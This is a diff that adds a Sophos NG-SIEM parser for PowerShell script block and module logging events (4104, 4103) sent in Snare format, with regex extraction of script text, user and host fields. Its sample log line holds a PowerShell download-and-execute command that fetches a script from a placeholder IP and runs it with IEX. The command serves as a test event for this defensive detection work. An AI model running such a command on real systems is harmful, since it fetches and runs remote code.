@@ -1,0 +1,71 @@
+!SAMPLE=<182>Oct 15 00:31:05 ws01.example.com MSWinEventLog	1	Microsoft-Windows-PowerShell/Operational	30411	Thu Oct 15 00:31:05 2026	4104	Microsoft-Windows-PowerShell	EXAMPLE\jdoe	User	Warning	ws01.example.com	Execute a Remote Command		Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')  ScriptBlock ID: 6a2b3c4d-1e2f-4a5b-8c6d-7e8f9a0b1c2d Path: 	30411
+!PARENT=SNARE_Unsupported
+!CONFIRMWITH=PATTERN
+!CONFIRMSTRING=MSWinEventLog\t[^\t]*\t(?:Microsoft-Windows-PowerShell|PowerShellCore)/Operational\t[^\t]*\t[^\t]*\t410[34]\t
+!SCHEMA=scwx.managementevent
+!TRIMALLOFF
+
+# Parser Studio 0.1.0: https://github.com/Aaronjacobs000/sophos-ngsiem-parser-studio
+# Emulator result, not run in Sophos NG-SIEM. Test with Parse Message and Run Test before you turn it on.
+# Source: PowerShell script block logging (event 4104) and module logging (event 4103) from the
+# Microsoft-Windows-PowerShell/Operational log (Windows PowerShell 5.1) and the
+# PowerShellCore/Operational log (PowerShell 7), sent in Snare format over syslog by NXLog or the
+# Snare agent, the feed the Sophos Windows Event Log integration reads.
+# Child of the global parser SNARE_Unsupported, the child of Microsoft_Windows_SNARE_Master that
+# takes the Snare events no other built-in parser handles and leaves them in the generic schema.
+# Under SNARE_Unsupported it doesn't compete with it: in Run Test a sibling of SNARE_Unsupported
+# lost every line after one SNARE_Unsupported took. In Sophos Fusion, turn on Set Global Parent in
+# Parser Script. The parser reads the whole line itself, not the parents' variables.
+# Snare fields are tab separated: MSWinEventLog, criticality, log name, Snare counter, date and
+# time, event ID, source, user, SID type, event type, computer, category, data string, the
+# rendered message, and the event log counter. The agents replace the message's line breaks and
+# tabs with spaces.
+
+s = originalData$|MSWinEventLog\t(?P<crit>[^\t]*)\t(?P<log>[^\t]*)\t(?P<counter>[^\t]*)\t(?P<dt>[^\t]*)\t(?P<eid>[^\t]*)\t(?P<source>[^\t]*)\t(?P<user>[^\t]*)\t(?P<sidtype>[^\t]*)\t(?P<etype>[^\t]*)\t(?P<computer>[^\t]*)\t(?P<category>[^\t]*)\t(?P<data>[^\t]*)\t(?P<msg>[^\t]*)(?:\t(?P<logcounter>[^\t]*))?
+msg = s["msg"]
+eid = s["eid"]
+sensorEventId$ = s["logcounter"]
+hostId$ = s["computer"]
+# These events carry no time of their own. The Snare date and time has no zone; Sophos asks you to
+# send it in UTC.
+eventTimeUsec$ = DATETIME(s["dt"], "Mon Jan 02 15:04:05 2006")
+
+sensorType$ = "Windows PowerShell"
+channel$ = s["log"]
+eventId$ = eid
+# The Snare parent puts the event ID in operation_id too; it isn't an operation ID, so clear it.
+operationId$ = NULL
+targetHostname$ = s["computer"]
+scriptLanguage$ = "PowerShell"
+
+# 4104: "Creating Scriptblock text (<n> of <m>): <script> ScriptBlock ID: <guid> Path: <path>".
+# Scripts over 20,000 characters come in several parts that share the ScriptBlock ID. The script
+# text has its own line breaks, so the greedy match ends at the last "ScriptBlock ID:".
+sb = msg|^Creating Scriptblock text \((?P<n>\d+) of (?P<m>\d+)\):\s?(?P<script>.*\S)\s+ScriptBlock ID: (?P<id>[0-9A-Fa-f-]{36})\s+Path:\s?(?P<path>.*?)\s*$
+# 4103: the pipeline detail (CommandInvocation and ParameterBinding lines), then "Context:" with
+# "Label = value" lines in a fixed order, then "User Data:".
+payload = msg|^(?P<v>.*?)\s+Context:\s
+hostName = msg|\sHost Name =\s?(?P<v>.*?)\s*Host Version =
+hostApp = msg|\sHost Application =\s?(?P<v>.*?)\s*Engine Version =
+cmdName = msg|\sCommand Name =\s?(?P<v>.*?)\s*Command Type =
+cmdType = msg|\sCommand Type =\s?(?P<v>.*?)\s*Script Name =
+scriptName = msg|\sScript Name =\s?(?P<v>.*?)\s*Command Path =
+ctxUser = msg|\sUser =\s?(?P<v>.*?)\s*Connected User =
+connUser = msg|\sConnected User =\s?(?P<v>.*?)\s*Shell ID =
+
+block = eid == "4104"
+part = IF sb["m"] != "" AND sb["m"] != "1" THEN ", part " + sb["n"] + " of " + sb["m"] ELSE ""
+operationName$ = IF block THEN "PowerShell script block" + part ELSE "PowerShell pipeline execution"
+script$ = IF block THEN sb["script"] ELSE payload["v"]
+scriptFilePath$ = IF block THEN sb["path"] ELSE scriptName["v"]
+scriptFilePath$ = IF scriptFilePath$ == "" THEN NULL ELSE scriptFilePath$
+# The command line of the process hosting PowerShell, and the cmdlet or function that ran.
+command$ = IF block THEN NULL ELSE hostApp["v"]
+operation$ = IF block THEN NULL ELSE cmdName["v"]
+# PowerShell logs a script block at Warning level when it finds suspicious content.
+possibleCause$ = IF block AND s["etype"] == "Warning" THEN "PowerShell flagged the script block as suspicious" ELSE NULL
+
+# 4103 names the user in its context; otherwise use the Snare user.
+username$ = IF ctxUser["v"] != "" THEN ctxUser["v"] ELSE s["user"]
+# ServerRemoteHost is the host for a PowerShell remoting session.
+remoteOperation$ = IF block THEN NULL ELSE hostName["v"] == "ServerRemoteHost" OR connUser["v"] != ""
